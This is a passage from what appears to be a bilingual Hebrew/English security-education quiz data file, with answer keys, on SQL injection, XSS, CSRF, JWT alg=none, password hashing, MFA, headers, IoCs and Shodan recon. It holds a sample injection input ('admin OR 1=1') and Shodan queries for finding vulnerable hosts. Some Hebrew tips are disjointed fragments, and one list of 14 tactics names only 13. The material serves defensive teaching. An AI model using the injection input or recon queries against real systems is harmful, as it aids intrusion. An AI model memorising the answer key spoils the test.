      explanation: "‏Service ClusterIP (למשל: 10.96.0.1) לא קיימת כ-real interface.\n\nעיקרי:\n- kube-proxy: מקשיב ל־Kubernetes API, כשService נוצרת → מוסיף iptables rules: DNAT 10.96.0.1:80 → בחר רנדומלי pod מEndpoints\n- IPVS mode: L4 load balancer kernel module, יעיל יותר מiptables ל-cluster גדול\n- Cilium יכול להחליף kube-proxy בeBPF: O(1) lookups במקום O(n) iptables rules",
      explanationEn: "Service ClusterIP (e.g., 10.96.0.1) does not exist as a real interface.\n\nMain Points:\n- kube-proxy: watches Kubernetes API, when Service is created it adds iptables rules: DNAT 10.96.0.1:80 randomly selects pod from Endpoints\n- IPVS mode: L4 load balancer kernel module, more efficient than iptables for large clusters\n- Cilium can replace kube-proxy with eBPF: O(1) lookups instead of O(n) iptables rules",
      qEn: "What is the role of kube-proxy in Kubernetes networking?",
      correctEn: "Manages iptables/IPVS rules on every node to route traffic from Service ClusterIP to the relevant pods",
      choicesEn: [
        "Manages iptables/IPVS rules on every node to route traffic from Service ClusterIP to the relevant pods",
        "Proxy between internet and cluster for security",
        "Manages DNS resolution for services",
        "Implements NetworkPolicy for filtering traffic between pods"
      ]
    }
    ],
110: [
    {
      q: "מה ההבדל בין SQLi ל־XSS?",
      correct: "‏SQLi תוקפת את מסד הנתונים בצד השרת. ‏XSS מריצה קוד זדוני בדפדפן של משתמש אחר",
      choices: [
        "‏SQLi תוקפת את מסד הנתונים בצד השרת. ‏XSS מריצה קוד זדוני בדפדפן של משתמש אחר",
        "שתי ההתקפות זהות — שתיהן מזריקות שאילתות SQL",
        "‏XSS תוקפת מסד נתונים, ו־SQLi תוקפת דפדפן",
        "‏SQLi מריצה Python ו־XSS מריצה JavaScript"
      ],
      explanation: "‏SQLi היא התקפה בצד השרת — התוקף משנה שאילתת SQL ומשיג גישה למסד הנתונים.\n\nעיקרי:\n- XSS היא התקפה בצד הלקוח — התוקף מזריק JavaScript שרץ בדפדפן הקורבן\n- המטרה של SQLi היא נתונים, ושל XSS היא גניבת session, עוגיות ופעולות משתמש",
      explanationEn: "SQLi is a server-side attack — the attacker changes the SQL query and gains access to the database.\n\nMain Points:\n- XSS is a client-side attack — the attacker injects JavaScript that runs in the victim's browser",
      qEn: "What is the difference between SQLi and XSS?",
      correctEn: "SQLi attacks the database on the server side.\nXSS runs malicious code in another user's browser",
      choicesEn: [
        "SQLi attacks the database on the server side.\nXSS runs malicious code in another user's browser",
        "Both attacks are the same — both inject SQL queries",
        "XSS attacks databases, SQLi attacks browsers",
        "SQLi runs Python and XSS runs JavaScript"
      ]
    },
    {
      q: "מה Prepared Statements ולמה הם מגנים מ־SQLi?",
      correct: "מקמפלים שאילתת SQL לפני הכנסת נתונים — הנתונים לא יכולים לשנות את מבנה השאילתה",
      choices: [
        "מקמפלים שאילתת SQL לפני הכנסת נתונים — הנתונים לא יכולים לשנות את מבנה השאילתה",
        "מצפינים את הנתונים לפני שמירה במסד הנתונים",
        "בודקים שאין תווים מיוחדים בקלט לפני שמירה",
        "מגבילים את אורך הקלט של המשתמש"
      ],
      explanation: "‏Prepared Statement מקמפל את מקומות ה-placeholder לפני הזנת הנתונים.\n\nעיקרי:\n- קלט כמו 'admin OR 1=1' יישמר כטקסט רגיל ולא יפורש כ־SQL\n- לעומת זאת, שרשור מחרוזות (string concatenation) מאפשר הזרקה כי הנתונים הופכים לחלק מהשאילתה",
      explanationEn: "A Prepared Statement compiles the placeholder positions before inserting data.\n\nMain Points:\n- Input like 'admin OR 1=1' is saved as plain text and not interpreted as SQL code, preventing injection",
      qEn: "What are Prepared Statements and why do they protect from SQLi?",
      correctEn: "They compile the SQL query before inserting data — the data cannot change the query structure",
      choicesEn: [
        "They compile the SQL query before inserting data — the data cannot change the query structure",
        "They encrypt the data before saving to the database",
        "They check for special characters in the input before saving",
        "They limit the length of the user's input"
      ]
    },
    {
      q: "מה Stored XSS ולמה הוא מסוכן יותר מ־Reflected?",
      correct: "‏Stored XSS נשמר במסד הנתונים ורץ על כל מבקר בעמוד. ‏Reflected XSS פוגע רק במי שלוחץ על קישור זדוני",
      choices: [
        "‏Stored XSS נשמר במסד הנתונים ורץ על כל מבקר בעמוד. ‏Reflected XSS פוגע רק במי שלוחץ על קישור זדוני",
        "‏Stored XSS מסוכן פחות כי הוא נשמר במסד נתונים ולא בכתובת",
        "‏Reflected XSS יותר מסוכן כי הוא בלתי נראה",
        "אין הבדל — שניהם רצים פעם אחת בלבד"
      ],
      explanation: "‏Reflected: סקריפט בכתובת URL חוזר בתגובה ורץ רק אצל מי שלוחץ.\n\nעיקרי:\n- Stored: תוקף כותב סקריפט בשדה תגובה, הוא נשמר במסד, וכל מבקר בעמוד מקבל ומריץ אותו\n- לדוגמה: XSS בפוסט בפורום — כל מי שקורא נגנב לו ה-session",
      explanationEn: "Reflected XSS: a script in the URL is returned in the response and runs only for the person who clicks.\n\nMain Points:\n- Stored XSS: the attacker writes a script in a comment field, it is saved in the database, and every visitor who views it is affected",
      qEn: "What is Stored XSS and why is it more dangerous than Reflected?",
      correctEn: "Stored XSS is saved in the database and runs on every visitor.\nReflected XSS only affects those who click a malicious link",
      choicesEn: [
        "Stored XSS is saved in the database and runs on every visitor.\nReflected XSS only affects those who click a malicious link",
        "Stored XSS is less dangerous because it is saved in a database",
        "Reflected XSS is more dangerous because it is invisible",
        "No difference — both run only once"
      ]
    },
    {
      q: "מה HttpOnly Cookie ואיך הוא מגן מ־XSS?",
      correct: "עוגייה שאינה נגישה ל־JavaScript — גם אם יש XSS, קוד זדוני לא יכול לקרוא אותה",
      choices: [
        "עוגייה שאינה נגישה ל־JavaScript — גם אם יש XSS, קוד זדוני לא יכול לקרוא אותה",
        "עוגייה שנשלחת רק בחיבור HTTPS",
        "עוגייה עם תפוגה קצרה לצורכי אבטחה",
        "עוגייה שמוצפנת בצד השרת"
      ],
      explanation: "‏כשמגדירים HttpOnly בעוגייה, הדפדפן מסרב לחשוף אותה ל־JavaScript.\n\nעיקרי:\n- בקשות רשת עדיין שולחות אותה אוטומטית\n- דגל Secure מגביל ל־HTTPS בלבד\n- דגל SameSite=Strict מונע שליחה בבקשות חוצות-אתרים (מגן מ־CSRF)",
      explanationEn: "When HttpOnly is set on a cookie, the browser refuses to expose it to JavaScript.\n\nMain Points:\n- Network requests still send it automatically\n- The Secure flag restricts the cookie to HTTPS connections only",
      qEn: "What is an HttpOnly Cookie and how does it protect from XSS?",
      correctEn: "A cookie that JavaScript cannot access — even with XSS, malicious code cannot read it",
      choicesEn: [
        "A cookie that JavaScript cannot access — even with XSS, malicious code cannot read it",
        "A cookie that is only sent over HTTPS",
        "A cookie with short expiration for security",
        "A cookie encrypted on the server side"
      ]
    },
    {
      q: "מה UNION-based SQL Injection?",
      correct: "הרצת שאילתת UNION SELECT כדי להוסיף שורות מטבלאות אחרות לתוצאה המקורית",
      choices: [
        "הרצת שאילתת UNION SELECT כדי להוסיף שורות מטבלאות אחרות לתוצאה המקורית",
        "איחוד שרתי מסד נתונים זדוניים",
        "הרצת UNION כדי לסגור את החיבור למסד",
        "שימוש ב־UNION לעדכון נתונים בטבלאות"
      ],
      explanation: "‏פקודת UNION SELECT מאחדת תוצאות משתי שאילתות.\n\nעיקרי:\n- בהזרקת SQL, התוקף מוסיף שורות מטבלה אחרת (למשל טבלת משתמשים) לתוצאה המקורית\n- הדרישה: אותו מספר עמודות וסוגים תואמים\n- טבלת information_schema.tables מכילה את כל שמות הטבלאות במסד",
      explanationEn: "UNION SELECT merges results from two queries.\n\nMain Points:\n- In SQL injection, the attacker adds rows from another table (such as the users table) to the original result, extracting sensitive data",
      qEn: "What is UNION-based SQL Injection?",
      correctEn: "Running a UNION SELECT query to add rows from other tables to the original result",
      choicesEn: [
        "Running a UNION SELECT query to add rows from other tables to the original result",
        "Combining malicious database servers",
        "Running UNION to close the database connection",
        "Using UNION to update data in tables"
      ]
    },
    {
      q: "מה CSP (Content-Security-Policy) ואיך מגן מ־XSS?",
      correct: "כותרת HTTP שמגבילה מאילו מקורות מותר לטעון סקריפטים — חוסמת קוד inline ומקורות זרים",
      choices: [
        "כותרת HTTP שמגבילה מאילו מקורות מותר לטעון סקריפטים — חוסמת קוד inline ומקורות זרים",
        "סינון XSS בצד השרת לפני שמירה",
        "הצפנת תוכן בין לקוח לשרת",
        "ביטול גישה ל־DOM עבור JavaScript"
      ],
      explanation: "‏CSP מנחה את הדפדפן לחסום: 1) סקריפטים inline, 2) JavaScript ממקורות לא מאושרים, 3) שימוש ב-eval.\n\nעיקרי:\n- מנגנון nonce מאפשר רק סקריפטים עם מזהה אקראי תואם\n- מצב Report-Only מדווח על חסימות בלי לחסום בפועל",
      explanationEn: "CSP tells the browser to block: 1) inline scripts, 2) JavaScript from unapproved sources, 3) use of eval.\n\nMain Points:\n- The nonce mechanism allows only specifically tagged scripts to run",
      qEn: "What is CSP (Content-Security-Policy) and how does it protect from XSS?",
      correctEn: "An HTTP header that limits which sources can load scripts — blocks inline code and foreign sources",
      choicesEn: [
        "An HTTP header that limits which sources can load scripts — blocks inline code and foreign sources",
        "Server-side XSS filtering before saving",
        "Encryption of content between client and server",
        "Disabling DOM access for JavaScript"
      ]
    }
  ],

  111: [
    {
      q: "\u200Fמה ההבדל בין Authentication ל־Authorization?",
      correct: "\u200FAuthentication = זיהוי (מי אתה?)\nAuthorization = הרשאות (מה מותר לך לעשות?)",
      choices: [
        "\u200FAuthentication = זיהוי (מי אתה?)\nAuthorization = הרשאות (מה מותר לך לעשות?)",
        "\u200FAuthentication = הרשאות\nAuthorization = זיהוי",
        "\u200Fשניהם זהים\nשניהם בודקים סיסמה",
        "\u200FAuthentication = HTTPS\nAuthorization = HTTP"
      ],
      explanation: "‏‏ Authentication (אימות) — מי אתה?\n\nעיקרי:\n- התחברות עם סיסמה\n- ביומטריה או תעודה דיגיטלית\n- Authorization (הרשאה) — מה מותר לך?\n\nטיפ:\nעל ידי שינוי מזהה בכתובת",
      explanationEn: "AuthN (Authentication): who are you.\n\nMain Points:\n- Login with username+password, biometrics, or certificate\n- AuthZ (Authorization): what are you allowed to do\n- RBAC, ACL, permissions",
      qEn: "What is the difference between Authentication and Authorization?",
      correctEn: "Authentication = identification (who are you?)\nAuthorization = permissions (what are you allowed to do?)",
      choicesEn: [
        "Authentication = identification (who are you?)\nAuthorization = permissions (what are you allowed to do?)",
        "Authentication = permissions\nAuthorization = identification",
        "They are the same\nboth check a password",
        "Authentication = HTTPS\nAuthorization = HTTP"
      ]
    },
    {
      q: "\u200Fלמה bcrypt עדיף על SHA256 לגיבוב סיסמאות?",
      correct: "\u200Fbcrypt מתוכנן להיות איטי בכוונה\n(בזכות מנגנון ה-work factor)\nSHA256 מהיר מדי — כרטיס מסך שובר אותו בשניות",
      choices: [
        "\u200Fbcrypt מתוכנן להיות איטי בכוונה\n(בזכות מנגנון ה-work factor)\nSHA256 מהיר מדי — כרטיס מסך שובר אותו בשניות",
        "\u200Fbcrypt מצפין\nSHA256 רק מבצע גיבוב",
        "\u200FSHA256 עדיף כי הוא חדש יותר",
        "\u200Fbcrypt מאובטח כי הוא קצר יותר"
      ],
      explanation: "‏‏ מהירות גיבוב — ההבדל הקריטי\n\nעיקרי:\n- GPU מודרני: 10 מיליארד SHA256/שנייה\n- bcrypt cost=12: רק ~300/שנייה\n- SHA256 — שניות\n\nטיפ:\nמאט גם חומרה ייעודית",
      explanationEn: "SHA256: a modern GPU computes 10 billion hashes/second.\n\nMain Points:\n- bcrypt cost=12: ~300 hashes/second per GPU\n- Brute-forcing 8 lowercase characters = 200 billion combinations\n- With SHA256: seconds",
      qEn: "Why is bcrypt better than SHA256 for hashing passwords?",
      correctEn: "bcrypt is designed to be slow on purpose\n(thanks to the work factor)\nSHA256 is too fast — a GPU breaks it in seconds",
      choicesEn: [
        "bcrypt is designed to be slow on purpose\n(thanks to the work factor)\nSHA256 is too fast — a GPU breaks it in seconds",
        "bcrypt encrypts\nSHA256 only hashes",
        "SHA256 is better because it is newer",
        "bcrypt is secure because it is shorter"
      ]
    },
    {
      q: "\u200Fמה פגיעות alg=none ב־JWT?",
      correct: "\u200Fשרת שמקבל alg=none מאמת טוקן ללא חתימה\nתוקף יכול לזייף כל תוכן (למשל user=admin)",
      choices: [
        "\u200Fשרת שמקבל alg=none מאמת טוקן ללא חתימה\nתוקף יכול לזייף כל תוכן (למשל user=admin)",
        "\u200FJWT עם alg=none מהיר יותר לעיבוד",
        "\u200Falg=none מצפין עם מפתח סימטרי",
        "\u200Falg=none נדרש לאפליקציות מובייל"
      ],
      explanation: "‏כותרת (אלגוריתם כמו HS256)\n\nעיקרי:\n- תוכן (payload)\n- חתימה (signature)\n- תוקף משנה אלגוריתם ל-none\n\nטיפ:\nHS256/RS256 — אסור לתת למשתמש לבחור!",
      explanationEn: "JWT header contains the algorithm (e.g., HS256) + payload + signature.\n\nMain Points:\n- If an attacker changes the header to alg=none and removes the signature, a vulnerable server accepts the unsigned token\n- Fix: whitelist algorithms on the server side (reject anything other than HS256/RS256)\n- Never let the user choose the algorithm",
      qEn: "What is the JWT alg=none vulnerability?",
      correctEn: "A server that accepts alg=none validates a token without a signature\nAn attacker can forge any content (e.g., user=admin)",
      choicesEn: [
        "A server that accepts alg=none validates a token without a signature\nAn attacker can forge any content (e.g., user=admin)",
        "JWT with alg=none is faster to process",
        "alg=none encrypts with a symmetric key",
        "alg=none is required for mobile applications"
      ]
    },
    {
      q: "\u200Fמה MFA ולמה הוא מגן גם אם סיסמה נגנבה?",
      correct: "\u200Fאימות רב-שלבי (MFA) מחייב 2+ גורמים:\nמשהו שיודע + משהו שיש לך/שאתה\nגנב הסיסמה חסר את הגורם השני",
      choices: [
        "\u200Fאימות רב-שלבי (MFA) מחייב 2+ גורמים:\nמשהו שיודע + משהו שיש לך/שאתה\nגנב הסיסמה חסר את הגורם השני",
        "\u200FMFA = שתי סיסמאות שונות",
        "\u200FMFA מצפין את הסיסמה פעמיים",
        "\u200FMFA = סיסמה ארוכה יותר מ־12 תווים"
      ],
      explanation: "‏ידע — סיסמה, PIN\n\nעיקרי:\n- חזקה — אפליקציית TOTP, SMS, מפתח חומרה (YubiKey)\n- ביומטריה — טביעת אצבע, זיהוי פנים\n- פישינג גונב סיסמה אבל לא קוד TOTP\n\nטיפ:\nWebAuthn/FIDO2 עמיד לפישינג",
      explanationEn: "Authentication factors: 1) Knowledge: password, PIN.\n\nMain Points:\n- 2) Possession: TOTP app, SMS, hardware key (YubiKey)\n- 3) Inherence: biometric (fingerprint, face)\n- MFA = combining 2+ factors",
      qEn: "What is MFA and why does it protect even if a password is stolen?",
      correctEn: "Multi-Factor Authentication (MFA) requires 2+ factors:\nsomething you know + something you have/are\nA password thief lacks the second factor",
      choicesEn: [
        "Multi-Factor Authentication (MFA) requires 2+ factors:\nsomething you know + something you have/are\nA password thief lacks the second factor",
        "MFA = two different passwords",
        "MFA encrypts the password twice",
        "MFA = a password longer than 12 characters"
      ]
    },
    {
      q: "\u200Fמה Salt בגיבוב סיסמאות?",
      correct: "\u200Fערך אקראי ייחודי שמוסיפים לכל סיסמה לפני גיבוב\nמונע טבלאות קשת ומחייב פיצוח נפרד לכל משתמש",
      choices: [
        "\u200Fערך אקראי ייחודי שמוסיפים לכל סיסמה לפני גיבוב\nמונע טבלאות קשת ומחייב פיצוח נפרד לכל משתמש",
        "\u200Fמפתח הצפנה סודי שמאחסנים במסד הנתונים",
        "\u200Fחלק נוסף מהסיסמה שהמשתמש מזין",
        "\u200Fpepper מוסיפים למסד\nsalt מוסיפים לקוד"
      ],
      explanation: "‏כל משתמשים עם אותה סיסמה = אותו hash\n\nעיקרי:\n- טבלת קשת (rainbow table) ממפה hash לסיסמה מראש\n- מוסיפים ערך אקראי לכל סיסמה\n- כל משתמש מקבל hash שונה\n\nטיפ:\nbcrypt ו־Argon2 מייצרים salt אוטומטית",
      explanationEn: "Without salt: every user with the same password gets the same hash.\n\nMain Points:\n- A rainbow table is a precomputed mapping of hash to plaintext\n- With salt: hash('password123' + random_salt) — each user's hash is different\n- Brute-force must recompute for each user",
      qEn: "What is Salt in password hashing?",
      correctEn: "A unique random value added to each password before hashing\nPrevents rainbow tables and forces separate cracking per user",
      choicesEn: [
        "A unique random value added to each password before hashing\nPrevents rainbow tables and forces separate cracking per user",
        "A secret encryption key stored in the database",
        "An extra part of the password that the user enters",
        "Pepper is added to the database\nSalt is added to the code"
      ]
    }
  ],

  112: [
    {
      q: "\u200Fמה CSP (Content-Security-Policy) עושה?",
      correct: "\u200Fמנחה את הדפדפן מאילו מקורות לטעון\nסקריפטים, סגנונות ותמונות\nמגן מ־XSS על ידי חסימת קוד inline ומקורות זרים",
      choices: [
        "\u200Fמנחה את הדפדפן מאילו מקורות לטעון\nסקריפטים, סגנונות ותמונות\nמגן מ־XSS על ידי חסימת קוד inline ומקורות זרים",
        "\u200Fמצפין תוכן בין לקוח לשרת",
        "\u200Fמסנן תוכן זדוני בצד השרת",
        "\u200Fמגביל גישה לנקודות API לפי כתובת IP"
      ],
      explanation: "‏‏ כותרת CSP\n\nעיקרי:\n- מורה לדפדפן לחסום JavaScript ממקורות לא מאושרים\n- חוסמת סקריפטים inline\n- חוסמת קריאות eval\n\nטיפ:\nמדווח על חסימות בלי לחסום בפועל",
      explanationEn: "CSP header instructs the browser to block: JS from unapproved sources, inline script tags, and eval().\n\nMain Points:\n- Nonce: each page load receives a random nonce — only scripts with the matching nonce are allowed\n- Report-Only mode reports violations without blocking\n- This is a powerful defense against XSS attacks",
      qEn: "What does CSP (Content-Security-Policy) do?",
      correctEn: "Tells the browser which sources are allowed to load\nscripts, styles, and images\nProtects from XSS by blocking inline code and foreign sources",
      choicesEn: [
        "Tells the browser which sources are allowed to load\nscripts, styles, and images\nProtects from XSS by blocking inline code and foreign sources",
        "Encrypts content between client and server",
        "Filters malicious content on the server side",
        "Restricts API endpoint access by IP address"
      ]
    },
    {
      q: "\u200Fמה HSTS ולמה הוא מגן מהתקפת SSL Stripping?",
      correct: "\u200Fכותרת HTTP שמכריחה את הדפדפן לעבוד רק ב־HTTPS\nניסיון לשדרג לאחור ל־HTTP נכשל",
      choices: [
        "\u200Fכותרת HTTP שמכריחה את הדפדפן לעבוד רק ב־HTTPS\nניסיון לשדרג לאחור ל־HTTP נכשל",
        "\u200Fמאמת תעודת שרת ומסרב לרשויות לא מהימנות",
        "\u200Fמצפין עוגיות אוטומטית",
        "\u200Fמגביל חיבורי TLS לגרסה 1.3 בלבד"
      ],
      explanation: "‏‏ התקפת SSL Stripping\n\nעיקרי:\n- תוקף באמצע (MITM) מקבל HTTPS מהשרת\n- אבל משדרג לאחור ל־HTTP עם הלקוח\n- כותרת HSTS\n\nטיפ:\nמגן גם בביקור ראשון",
      explanationEn: "SSL Stripping (Moxie Marlinspike 2009): a MITM attacker receives HTTPS from the server but downgrades to HTTP with the client.\n\nMain Points:\n- HSTS: Strict-Transport-Security: max-age=31536000\n- The browser remembers: always use HTTPS for this site, even if the user types http://\n- Preload: added to the browser's hardcoded list — protects even the first visit",
      qEn: "What is HSTS and why does it protect from SSL Stripping?",
      correctEn: "An HTTP header that forces the browser to use HTTPS only\nA downgrade attempt to HTTP fails",
      choicesEn: [
        "An HTTP header that forces the browser to use HTTPS only\nA downgrade attempt to HTTP fails",
        "Validates the server certificate and rejects untrusted authorities",
        "Encrypts cookies automatically",
        "Limits TLS connections to version 1.3 only"
      ]
    },
    {
      q: "\u200Fמה CSRF ואיך SameSite=Strict מגן ממנו?",
      correct: "\u200Fהתקפת CSRF גורמת לדפדפן לשלוח בקשה לאתר X\nמאתר זדוני עם העוגיות של X\nדגל SameSite=Strict מונע שליחת עוגיות בבקשות חוצות-אתרים",
      choices: [
        "\u200Fהתקפת CSRF גורמת לדפדפן לשלוח בקשה לאתר X\nמאתר זדוני עם העוגיות של X\nדגל SameSite=Strict מונע שליחת עוגיות בבקשות חוצות-אתרים",
        "\u200FCSRF גונבת עוגיות ישירות מהדפדפן",
        "\u200FCSRF = מסנן בקשות חוצות-אתרים",
        "\u200FSameSite מצפין עוגיות בין אתרים"
      ],
      explanation: "‏‏ איך CSRF עובד?\n\nעיקרי:\n- באתר זדוני, תגית תמונה עם כתובת של הבנק\n- הדפדפן שולח בקשה עם העוגיות של הבנק\n- כי הדפדפן מוסיף עוגיות אוטומטית\n\nטיפ:\nאתר זדוני לא יכול לדעת אותו",
      explanationEn: "In CSRF: a malicious site embeds a request to bank.com, and the browser sends it with the user's cookies (because browsers attach cookies automatically).\n\nMain Points:\n- SameSite=Strict: cookie is sent only for same-site requests\n- Lax: only for top-level navigation\n- None: all cross-site (legacy)",
      qEn: "What is CSRF and how does SameSite=Strict protect against it?",
      correctEn: "A CSRF attack makes the browser send a request to site X\nfrom a malicious site with X's cookies\nSameSite=Strict prevents sending cookies in cross-site requests",
      choicesEn: [
        "A CSRF attack makes the browser send a request to site X\nfrom a malicious site with X's cookies\nSameSite=Strict prevents sending cookies in cross-site requests",
        "CSRF steals cookies directly from the browser",
        "CSRF = a cross-site request filter",
        "SameSite encrypts cookies between sites"
      ]
    },
    {
      q: "\u200Fמה X-Frame-Options ולמה חשוב?",
      correct: "\u200Fמונע טעינת האתר ב-iframe\nמגן מהתקפת Clickjacking שבה אתר זדוני\nמסתיר iframe על כפתור שהמשתמש לוחץ",
      choices: [
        "\u200Fמונע טעינת האתר ב-iframe\nמגן מהתקפת Clickjacking שבה אתר זדוני\nמסתיר iframe על כפתור שהמשתמש לוחץ",
        "\u200Fמגביל קצב פריימים של הדפדפן לחיסכון בחשמל",
        "\u200Fמצפין כותרות X בבקשת HTTP",
        "\u200Fמסיר כותרות X מהתגובה לצמצום דליפת מידע"
      ],
      explanation: "‏‏ התקפת Clickjacking\n\nעיקרי:\n- אתר זדוני כולל iframe מוסתר של אתר הבנק\n- עם כפתור מעליו\n- המשתמש לוחץ על 'זכה בפרס!'\n\nטיפ:\nCSP frame-ancestors",
      explanationEn: "Clickjacking: a malicious site embeds the target site in a hidden iframe with a button overlay.\n\nMain Points:\n- The user clicks 'Win a Prize!' but actually clicks 'Transfer Money' on the hidden iframe\n- X-Frame-Options: DENY — never allow framing\n- SAMEORIGIN — allow only from same origin",
      qEn: "What is X-Frame-Options and why is it important?",
      correctEn: "Prevents loading the site in an iframe\nProtects from Clickjacking where a malicious site\nhides an iframe over a button the user clicks",
      choicesEn: [
        "Prevents loading the site in an iframe\nProtects from Clickjacking where a malicious site\nhides an iframe over a button the user clicks",
        "Limits browser frame rate to save power",
        "Encrypts X headers in the HTTP request",
        "Removes X headers from the response to reduce information leakage"
      ]
    }
  ],

  113: [
    {
      q: "\u200Fמה IoC? תן 3 דוגמאות.",
      correct: "\u200Fסימן לפריצה (Indicator of Compromise)\nעדות שמערכת נפרצה\nדוגמאות: כתובת IP של שרת שליטה, hash של קובץ נוזקה, דומיין זדוני",
      choices: [
        "\u200Fסימן לפריצה (Indicator of Compromise)\nעדות שמערכת נפרצה\nדוגמאות: כתובת IP של שרת שליטה, hash של קובץ נוזקה, דומיין זדוני",
        "\u200Fראשי תיבות של Internet of Cybersecurity — מכשירי IoT עם אבטחה",
        "\u200Fמדד פריצה (Index of Compromise) — דירוג רמת הפריצה",
        "\u200Fמרכז תפעול פנימי (Internal Operations Center)"
  ],
      explanation: "‏‏ סימני פריצה כוללים\n\nעיקרי:\n- כתובות IP\n- hash של קבצים (MD5/SHA256)\n- דומיינים\n\nטיפ:\nכתובת IP או דומיין מתחלפים תוך ימים",
      explanationEn: "IoCs (Indicators of Compromise): IP addresses (C2 servers), file hashes (MD5/SHA256 of malware), domains (phishing/C2), URLs (payload delivery), email subjects/senders, registry keys (persistence), mutex names (malware fingerprints).\n\nMain Points:\n- IoC sources: VirusTotal, AlienVault OTX, MISP, Shodan\n- IoCs go stale quickly — IPs/domains rotate within days",
      qEn: "What is an IoC? Give 3 examples.",
      correctEn: "Indicator of Compromise\nEvidence that a system was breached\nExamples: C2 server IP, malware file hash, malicious domain",
      choicesEn: [
        "Indicator of Compromise\nEvidence that a system was breached\nExamples: C2 server IP, malware file hash, malicious domain",
        "Internet of Cybersecurity — IoT devices with security",
        "Index of Compromise — a rating of the breach level",
        "Internal Operations Center"
      ]
    },
    {
      q: "\u200Fמה MITRE ATT&CK?",
      correct: "\u200Fמסגרת פתוחה עם 14 טקטיקות\nומאות טכניקות של קבוצות תקיפה\nממפה שיטות תקיפה ומקשרת להגנות",
      choices: [
        "\u200Fמסגרת פתוחה עם 14 טקטיקות\nומאות טכניקות של קבוצות תקיפה\nממפה שיטות תקיפה ומקשרת להגנות",
        "\u200Fתקן הצפנה לנתוני מודיעין איומים",
        "\u200Fחברת אבטחה שמזהה חתימות נוזקה",
        "\u200Fפרוטוקול לשיתוף סימני פריצה בין ארגונים"
      ],
      explanation: "‏‏ 14 טקטיקות (מה מנסה התוקף)\n\nעיקרי:\n- סיור\n- גישה ראשונית\n- הרצה\n\nטיפ:\nמציג ויזואליזציה של כיסוי",
      explanationEn: "MITRE ATT&CK has 14 Tactics (what the attacker is trying to do): Reconnaissance, Initial Access, Execution, Persistence, Privilege Escalation, Defense Evasion, Credential Access, Discovery, Lateral Movement, Collection, Command & Control, Exfiltration, Impact.\n\nMain Points:\n- Each Tactic contains Techniques (T1566 = Phishing) and Sub-techniques\n- Navigator provides coverage visualization\n- Purple teaming: Red team attacks, Blue team detects",
      qEn: "What is MITRE ATT&CK?",
      correctEn: "An open framework with 14 tactics\nand hundreds of techniques used by attack groups\nMaps attack methods and links them to defenses",
      choicesEn: [
        "An open framework with 14 tactics\nand hundreds of techniques used by attack groups\nMaps attack methods and links them to defenses",
        "An encryption standard for threat intelligence data",
        "A security company that identifies malware signatures",
        "A protocol for sharing IoCs between organizations"
      ]
    },
    {
      q: "\u200Fמה ההבדל בין סיור פסיבי (Passive) לאקטיבי (Active) ב־OSINT?",
      correct: "\u200Fסיור פסיבי: מקורות ציבוריים בלי לגעת ביעד (Shodan, WHOIS)\nסיור אקטיבי: שליחת בקשות ישירות ליעד (nmap)\nניתן לגילוי",
      choices: [
        "\u200Fסיור פסיבי: מקורות ציבוריים בלי לגעת ביעד (Shodan, WHOIS)\nסיור אקטיבי: שליחת בקשות ישירות ליעד (nmap)\nניתן לגילוי",
        "\u200Fפסיבי = ניטור ב־SOC, אקטיבי = צוות אדום",
        "\u200Fפסיבי = איטי, אקטיבי = מהיר",
        "\u200Fפסיבי = ללא כלים, אקטיבי = עם כלי אוטומציה"
      ],
      explanation: "‏‏ סיור פסיבי\n\nעיקרי:\n- Shodan (סריקה שנעשתה על ידי צד שלישי)\n- WHOIS\n- Google Dorks\n\nטיפ:\nב־Bug Bounty: בדרך כלל פסיבי בלבד בהתחלה",
      explanationEn: "Passive Recon: Shodan (scans done by a third party), WHOIS, Google Dorks, LinkedIn, theHarvester — the target sees no traffic from you.\n\nMain Points:\n- Active Recon: nmap, ping sweep, directory busting — gets logged by the target\n- In practice: pentest scope defines what is allowed\n- Bug Bounty: typically passive-only for initial reconnaissance",
      qEn: "What is the difference between Passive and Active Recon in OSINT?",
      correctEn: "Passive: public sources without touching the target (Shodan, WHOIS)\nActive: sending requests directly to the target (nmap)\nCan be detected",
      choicesEn: [
        "Passive: public sources without touching the target (Shodan, WHOIS)\nActive: sending requests directly to the target (nmap)\nCan be detected",
        "Passive = SOC monitoring, Active = Red Team",
        "Passive = slow, Active = fast",
        "Passive = without tools, Active = with automation tools"
      ]
    },
    {
      q: "\u200Fמה Shodan ואיזה מידע ניתן למצוא בו?",
      correct: "\u200Fמנוע חיפוש למכשירים המחוברים לאינטרנט\nמציג פורטים פתוחים, באנרים, תעודות ושירותים פגיעים",
      choices: [
        "\u200Fמנוע חיפוש למכשירים המחוברים לאינטרנט\nמציג פורטים פתוחים, באנרים, תעודות ושירותים פגיעים",
        "\u200Fמנוע חיפוש לתוספים זדוניים במחשב",
        "\u200Fכלי לניתוח נוזקה של חברת Shodan",
        "\u200Fשרת DNS שמפרסם מודיעין איומים"
      ],
      explanation: "‏‏ Shodan\n\nעיקרי:\n- סורק את כל כתובות IPv4 ושומר באנרים\n- חיפוש לפי hostname, פורט, מוצר, מדינה או פגיעות ספציפית\n- דוגמאות\n\nטיפ:\nZoomeye הוא הגרסה הסינית",
      explanationEn: "Shodan scans all of IPv4 and stores banners.\n\nMain Points:\n- Search examples: hostname:example.com port:22 finds exposed SSH\n- product:Redis finds Redis instances (often without authentication)\n- country:IL vuln:CVE-2017-0144 finds EternalBlue-vulnerable systems",
      qEn: "What is Shodan and what information can you find on it?",
      correctEn: "A search engine for internet-connected devices\nShows open ports, banners, certificates, and vulnerable services",
      choicesEn: [
        "A search engine for internet-connected devices\nShows open ports, banners, certificates, and vulnerable services",
        "A search engine for malicious browser extensions",
        "A malware analysis tool by Shodan company",
        "A DNS server that publishes threat intelligence"
      ]
    }
  ],

  114: [
    {
      q: "\u200Fמה 6 שלבי תגובה לאירוע לפי NIST?",
      correct: "\u200Fהכנה → זיהוי → בלימה → חיסול → שחזור → לקחים",
      choices: [
        "\u200Fהכנה → זיהוי → בלימה → חיסול → שחזור → לקחים",
        "\u200Fגילוי → ניתוח → מיתון → דיווח → שחזור → סקירה",
        "\u200Fהתרעה → מיון → בידוד → תיקון → ניטור → סגירה",
        "\u200Fגילוי → הסלמה → תגובה → טלאי → בדיקה → פריסה"
      ],
      explanation: "‏‏ מחזור חיי תגובה לאירוע (NIST SP 800-61)\n\nעיקרי:\n- 1⃣ הכנה\n- נהלים, כלים, הדרכות\n- 2⃣ זיהוי\n\nטיפ:\nסקירה תוך שבועיים",
